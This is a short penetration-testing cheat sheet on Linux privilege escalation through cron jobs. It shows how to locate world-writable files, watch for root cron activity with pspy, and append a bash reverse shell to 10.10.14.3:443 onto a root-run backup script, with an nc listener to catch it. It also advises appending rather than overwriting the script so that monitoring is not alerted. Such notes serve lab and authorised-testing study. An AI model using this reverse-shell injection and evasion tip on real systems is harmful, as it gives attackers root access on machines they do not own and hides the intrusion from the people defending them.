## Cron Job Abuse

Cron executes scheduled tasks at defined intervals. Each entry in a crontab follows this format:

```
minutes  hours  days  months  weekdays  command
0        */12   *     *       *         /home/admin/backup.sh
```

Cron files per user live in `/var/spool/cron`. Applications may also place jobs in `/etc/cron.d` — sometimes with misconfigured permissions that allow non-root users to modify them.

---

### Find world-writable files

```shell
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

Any writable script running as root via cron is a direct escalation path.

---

### Confirm cron activity with pspy

[pspy](https://github.com/DominicBreuker/pspy) monitors running processes and executed commands without requiring root — it works by polling `/proc` at a defined interval:

```shell
./pspy64 -pf -i 1000
```

Watch the output for commands triggered on a regular schedule. A script running every few minutes owned by root is the target.

---

### Exploit — inject a reverse shell

Once a world-writable root-owned script is confirmed, append a reverse shell payload:

```bash
echo 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1' >> /dmz-backups/backup.sh
```

Start a listener before the next cron execution:

```shell
nc -lvnp 443
```

> 💡 Append (`>>`) rather than overwrite (`>`) the script — preserving the original content avoids alerting monitoring systems that check for unexpected job failures.
